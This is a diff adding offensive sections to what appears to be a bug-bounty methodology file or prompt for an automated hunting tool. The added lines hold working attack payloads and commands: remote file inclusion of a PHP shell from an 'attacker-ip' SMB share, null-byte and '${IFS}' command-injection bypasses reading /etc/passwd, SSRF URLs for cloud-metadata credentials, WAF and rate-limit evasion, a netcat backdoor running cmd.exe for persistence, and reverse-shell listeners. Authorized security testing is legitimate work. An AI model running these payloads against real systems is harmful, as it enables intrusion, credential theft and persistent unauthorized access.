@@ -12,6 +12,10 @@ A. Advanced Recon & Cloud Surface
 
 Advanced reconnaissance and cloud surface mapping are essential skills for pwn challenges, bug bounties, and web app security testing, building on your focus in vulnerability hunting and AWS security. [blog.intelligencex](https://blog.intelligencex.org/zero-day-hunting-advanced-recon-techniques-2025)
 
+## Protocol Abuse & Bypass (New Insight)
+- **SMB RFI Bypass**: On Windows servers, if `allow_url_include` is OFF, simple RFI payloads fail. You must attempt to load PHP shells via SMB shares: `?page=\\attacker-ip\share\shell.php`. This bypasses the directive because PHP treats UNC paths as local files.
+- **Null Byte Injection**: For legacy systems, append `%00` to bypass extension checks (e.g., `?page=shell.php%00`).
+
 ## Core Concepts
 Reconnaissance gathers intel on targets without direct interaction (passive) or through probing (active), while cloud surface refers to the external attack surface like exposed buckets, APIs, and misconfigs in AWS, Azure, or GCP. In bug bounties, this uncovers hidden assets for high-payout bugs like open storage or forgotten subdomains. Prioritize passive methods first to avoid detection, aligning with your methodical hunt patterns. [perplexity](https://www.perplexity.ai/search/ebadcf46-9af5-4f45-b489-59d804121ca7)
 
@@ -103,6 +107,12 @@ Fuzz payloads systematically with Burp Intruder or sqlmap's --tamper scripts, ro
 | Parsing Exploits | Multipart boundary fuzz | Cloudflare/AWS WAFs  [arxiv](https://arxiv.org/html/2503.10846v3) |
 | Rate Evasion | Burp IP Rotate + delays | Heavy fuzzing  [mdsec.co](https://www.mdsec.co.uk/2024/10/when-wafs-go-awry-common-detection-evasion-techniques-for-web-application-firewalls/)
 
+## Advanced Fuzzing Architecture (Wfuzz Logic)
+- **Recursive Fuzzing**: Do not just fuzz top-level directories. If a directory is found (e.g., `/admin/`), immediately recurse into it with a depth of 2-3 levels.
+- **Smart Filtering**: Filter responses not just by status code (e.g., `--hc 404`) but by "Word Count" or "Line Count" divergence. If the baseline 404 is 120 lines, any 200 OK with 120 lines is likely a soft 404.
+- **Session Management**: For large fuzzing campaigns, save the "Recipes" (fuzzing state) to resume or analyze offline.
+- **Header Fuzzing**: SYSTEMATICALLY fuzz headers. payloads like `X-Forwarded-For: 127.0.0.1`, `Client-IP: 127.0.0.1`, and `Host: internal.target` to expose administrative panels or bypass restrictions.
+
 Smart Rate-Limiting: Implement adaptive delays. If the tool detects a 403 or 429 status code, it must automatically slow down or rotate proxies.
 
 Header Randomization: Every request must use randomized User-Agents and "Origin-spoofing" headers (X-Forwarded-For, X-Real-IP).
@@ -116,6 +126,81 @@ Orchestrator: Python 3.10+ (Asyncio/Aiohttp).
 Storage: File output for update founding, make the output easy to read, short and forcus on main point.
 
 Core Binaries: subfinder, httpx, katana, nuclei, trufflehog (for secrets), ffuf (for fuzzing).
+
+## Elite Arsenal & Tooling Configuration
+This section defines the mandatory toolset for "Deep-Dive" operations, selected based on high-fidelity results and automation capabilities.
+
+### 1. Burp Suite Pro Extensions (The "Quad-Core" Setup)
+These extensions MUST be installed and configured to elevate Burp from a proxy to a weaponized scanner.
+-   **Active Scan++** (James Kettle): Extends active scanning to find Host Header attacks, Edge Side Includes (ESI), and Cache Poisoning.
+    -   *Config*: Requires **Jython Standalone JAR**. Configure in `Extender > Options > Python Environment`.
+-   **XSS Validator** (John Poulin): Automates XSS verification, eliminating false positives by executing payloads in a headless browser.
+    -   *Config*: Requires **PhantomJS** running locally (`phantomjs.exe xss.js`). Set `Grep Phrase` in Burp to match the PhantomJS callback.
+-   **Software Vulnerability Scanner**: Scans for known CVEs in libraries using `vulners.com` API.
+    -   *Config*: Enable "Use scan by location paths" to fingerprint software versions from URL structures.
+-   **Retire.js**: Passive analysis of outdated JavaScript libraries (e.g., old jQuery, Angular) with known CVEs.
+
+### 2. Advanced Fuzzing Engine: Wfuzz
+Use `wfuzz` for granular control when `ffuf` is too blunt.
+-   **Logic**: `wfuzz -z file,wordlist.txt --sc 200,301 -Z http://target.com/FUZZ`
+-   **Power Move**: Use `--oF` to save sessions and resume later. Use filters like `--filter "c=200 and l>100"` to remove "soft 404s" based on line count.
+
+### 3. Specialized Scanners
+-   **Nuclei**: The "First Strike" capability. Always run with custom templates for `technologies` detection before deep scanning.
+-   **LinkFinder**: for recursive JS analysis. Parse every `.js` file found to extract hidden endpoints.
+-   **Arjun**: For parameter discovery. Hidden parameters (`?debug=true`) are often the vector for IDOR/SSRF.
+
+## Pro-Tips & Tradecraft (From "Bug Bounty Tips.pdf")
+
+### IDOR & Logic Flaws
+-   **Parameter Pollution**: If `GET /api/msgs?user_id=123` fails, try `user_id[]=123&user_id[]=456` or `user_id=123&user_id=456`.
+-   **JSON Parameter Swapping**: Change integer IDs to arrays `{"id": 123}` -> `{"id": [123]}` to bypass type checks.
+-   **Price Manipulation**: In shopping carts, try negative numbers (`qty=-1`), decimals (`0.01`), or large overflows.
+
+### RCE & Command Injection
+-   **Space Bypass**: If spaces are blocked, use `${IFS}`, `%09` (tab), or `<` redirectors.
+    -   Example: `cat${IFS}/etc/passwd`
+-   **Common Params**: Fuzz aggressively for: `cmd`, `exec`, `command`, `execute`, `ping`, `query`, `jump`, `code`, `reg`, `do`, `func`, `arg`, `option`.
+
+### SSRF "Search & Destroy"
+-   **Cloud Metadata Targets**:
+    -   AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+    -   Google Cloud: `http://metadata.google.internal/computeMetadata/v1/` (Header: `Metadata-Flavor: Google`)
+-   **Bypass Tricks**: Use `0` instead of `127.0.0.1`, IPv6 `[::]`, or enclose in quotes/brackets if the parser is weak.
+
+## CLI Command & Control: The Kill Chain
+Use these tools when GUI workflows fail or for automation.
+
+### Phase 1: Reconnaissance & Enumeration
+| Tool | Command | Purpose |
+| :--- | :--- | :--- |
+| **Subfinder** | `subfinder -d target.com -o subs.txt` | Passive subdomain enumeration. |
+| **Amass** | `amass enum -passive -d target.com` | Deep passive recon. |
+| **Gau** | `gau target.com` | "Get All Urls" - fetches from Wayback, AlienVault, etc. (Must Have). |
+| **Chaos** | `chaos -d target.com` | ProjectDiscovery's reconnaissance tool. |
+| **WPScan** | `wpscan --url <target> -e ap,at,u` | Wordpress Enum: Plugins (ap), Themes (at), Users (u). |
+| **Nikto** | `nikto -h <target>` | Legacy server scanner, great for finding outdated server headers/files. |
+| **Netcat** | `nc -nv <ip> <port>` | Banner grabbing and raw TCP interaction. |
+
+### Phase 2: Vulnerability Discovery
+| Tool | Command | Purpose |
+| :--- | :--- | :--- |
+| **Naabu** | `naabu -host <target>` | Fast port scanner (Golang), alternative to Masscan. |
+| **RustScan** | `rustscan -a <target>` | Ultra-fast port scanner (Rust). |
+| **Feroxbuster** | `feroxbuster -u <url>` | Fast content discovery (Rust), replaces Dirb/Dirbuster. |
+| **FFuf** | `ffuf -u <url>/FUZZ -w <wordlist>` | The ultimate fuzzer for params, dirs, and vhosts. |
+
+### Phase 3: Exploitation & Injection
+| Tool | Command | Purpose |
+| :--- | :--- | :--- |
+| **SQLMap** | `sqlmap -u "<url>" --batch --dbs` | Automated SQL Injection. Use `--dump` to extract data. |
+| **Commix** | `commix --url="<url>" --data="<post_data>"` | OS Command Injection automation. |
+| **LFISuite** | `python lfisuite.py` | Automated LFI scanning/exploitation. |
+| **Netcat (Shell)** | `nc -lvp 4444` | Listener for reverse shells. |
+
+### Phase 3: Post-Exploitation & Persistence
+-   **Netcat Backdoors**: `nc.exe -Ldp 4445 -e cmd.exe` (Windows legacy persistence).
+-   **Reverse Shells**: Use `msfvenom` to generate payloads caught by `nc` listeners.
 
 4. Operational Protocols
 
@@ -136,3 +221,5 @@ Use httpx to find live hosts and their technologies.
 New Logic: For every host found, check if it's hosted on AWS/Azure/GCP and run a permutation check for related Cloud Buckets.
 
 Store all results in a SQLite database named hunter.db."
+
+Read the folder books/ and learn from it. More detail, more care full read for maxium learning.
